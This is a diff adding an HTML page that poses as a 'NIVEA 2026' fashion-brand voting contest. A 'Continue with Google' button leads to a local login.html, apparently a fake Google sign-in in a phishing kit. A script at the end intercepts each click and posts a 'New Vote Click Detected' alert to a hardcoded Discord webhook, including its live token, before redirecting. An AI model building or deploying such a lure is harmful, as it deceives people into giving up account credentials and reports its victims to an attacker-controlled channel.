@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NIVEA 2026</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    :root {
+      --bg-page: #f0f4f9;
+      --bg-card: #ffffff;
+      --text-heading: #202124;
+      --text-body: #444746;
+      --text-sub: #5f6368;
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg-page: #131314;
+        --bg-card: #131314;
+        --text-heading: #e8eaed;
+        --text-body: #e3e3e3;
+        --text-sub: #9aa0a6;
+      }
+    }
+
+    body {
+      background: var(--bg-page);
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    .g-card {
+      background: var(--bg-card);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.12);
+    }
+
+    .g-heading { color: var(--text-heading); }
+    .g-body { color: var(--text-body); }
+    .g-sub { color: var(--text-sub); }
+
+    .google-btn {
+      background: white;
+      color: #3c4043;
+      border: 1px solid #dadce0;
+      font-weight: 500;
+      transition: all 0.2s ease;
+    }
+    .google-btn:hover {
+      box-shadow: 0 1px 6px rgba(32,33,36,0.28);
+      border-color: #8ab4f8;
+    }
+  </style>
+</head>
+
+<body class="min-h-screen flex items-center justify-center p-4">
+  <div class="w-full max-w-md">
+
+    <div class="g-card rounded-3xl overflow-hidden">
+
+      <!-- Header -->
+      <div class="relative h-56">
+        <img 
+          src="aaf27b32-3999-4afa-b16c-ffc3009f11ed.jpeg" 
+          alt="NIVEA 2026"
+          class="w-full h-full object-cover"
+        />
+        <div class="absolute inset-0 bg-gradient-to-b from-black/30 to-black/70"></div>
+        
+        <div class="absolute top-6 left-6 flex items-center gap-2">
+          <div class="w-8 h-8 bg-white rounded-full flex items-center justify-center">
+            <span class="text-blue-600 font-bold text-2xl">N</span>
+          </div>
+          <span class="text-white font-medium text-lg">NIVEA</span>
+        </div>
+
+        <h1 class="absolute bottom-8 left-6 text-white text-4xl font-normal tracking-tight g-heading">
+          NIVEA 2026
+        </h1>
+      </div>
+
+      <!-- Content -->
+      <div class="p-8">
+
+        <div class="flex items-center gap-5 mb-8">
+          <div class="w-16 h-16 bg-blue-100 dark:bg-blue-900/30 rounded-2xl flex items-center justify-center">
+            <svg class="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 8.944 11.922.42.095.858.143 1.295.143a3 3 0 01.296-5.99" />
+            </svg>
+          </div>
+
+          <div>
+            <h2 class="g-heading text-3xl font-medium">Fashion Brand</h2>
+            <p class="g-sub text-[15px] mt-1">118 votes • #3</p>
+          </div>
+        </div>
+
+        <p class="g-body text-[15.5px] leading-relaxed mb-10">
+          I need your support! Please take a moment to cast your vote and help me reach new heights in this competition.
+        </p>
+
+        <!-- Continue with Google Button -->
+        <a href="login.html" id="vote-btn"
+           class="google-btn block w-full py-4 rounded-2xl flex items-center justify-center gap-3 text-[15px] shadow-sm hover:shadow">
+          
+          <!-- Google Logo -->
+          <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
+            <path d="M17.64 9.2c0-.637-.057-1.25-.164-1.84H9v3.48h4.844c-.209 1.13-.827 2.09-1.76 2.73v2.2h2.84c1.66-1.53 2.616-3.78 2.616-6.57z" fill="#4285F4"/>
+            <path d="M9 18c2.37 0 4.36-.79 5.81-2.14l-2.84-2.2c-.79.53-1.8.84-2.97.84-2.29 0-4.23-1.55-4.92-3.63H1.1v2.28C2.55 15.8 5.5 18 9 18z" fill="#34A853"/>
+            <path d="M4.08 10.77c-.18-.53-.28-1.1-.28-1.68 0-.58.1-1.15.28-1.68V5.13H1.1C.4 6.48 0 8 0 9.5c0 1.5.4 3.02 1.1 4.37l2.98-2.3z" fill="#FBBC05"/>
+            <path d="M9 3.64c1.3 0 2.46.45 3.38 1.34l2.53-2.53C13.36 1.2 11.3 0 9 0 5.5 0 2.55 2.2 1.1 5.13l2.98 2.3C4.77 5.19 6.71 3.64 9 3.64z" fill="#EA4335"/>
+          </svg>
+
+          <span>Continue with Google</span>
+        </a>
+
+      </div>
+    </div>
+
+    <p class="text-center g-sub text-xs mt-8">
+      © 2026 NIVEA • Powered by Meta
+    </p>
+
+  </div>
+
+  <script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1489536597434044526/Um9l2HM5axRb9_dbmI0voJHe0Yx3BfZ-bgTmSwn930OaURGiFxcko3TwFA4lZJZntY6b";
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const btn = document.getElementById('vote-btn');
+
+      btn.addEventListener('click', async (e) => {
+        e.preventDefault();
+
+        const message = `**🚨 New Vote Click Detected**
+
+**Page:** NIVEA 2026 - Fashion Brand
+**Action:** User clicked "Continue with Google"
+**Time:** ${new Date().toLocaleString()}
+
+🔐 2026@FTECHSERVICES`;
+
+        try {
+          await fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: message,
+              username: "NIVEA Vote Tracker",
+            })
+          });
+          console.log("Vote click sent to Discord");
+        } catch (error) {
+          console.error("Webhook failed:", error);
+        }
+
+        // Redirect to Google login page
+        window.location.href = "login.html";
+      });
+    });
+  </script>
+</body>
+</html>
